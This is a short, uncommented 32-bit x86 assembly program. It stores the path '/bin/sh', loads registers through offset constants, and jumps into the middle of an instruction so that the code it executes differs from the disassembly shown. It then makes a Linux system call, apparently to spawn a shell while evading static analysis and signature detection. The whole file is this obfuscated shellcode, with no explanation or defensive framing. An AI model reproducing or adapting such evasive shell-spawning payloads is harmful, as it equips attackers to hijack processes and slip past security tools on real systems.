BITS 32

section .data
	shellpath: db "/bin/sh",0
	shellpathlen: equ $-shellpath
	eaxData dd 1
	ecxData dd 1
	edxData dd 1
	ebxData dd 1
	ediData dd 1
	ebpData dd 1
section .text
	global _start

_start:

lea esi, [shellpath-1]
lea ebx, [ebxData]
add ebx, 0x3fcefe3a
lea ecx, [ecxData]
sub ecx, 0xbb80c46
lea eax, [eaxData]
sub eax, 0x0
push ebp
lea ebp, [ebpData]
sub ebp, 0x84e8d1e

jmp hep+0x2

hep:
test word [ebx-0x3fcefe3a], 0x7689
or [ecx+0xbb80c46], cl
add [eax], al
add [ebp+0x84e8d1e], cl
lea edx, [esi+0xc]
int 0x80
pop ebp
mov eax, 1
mov ebx, 0

int 0x80
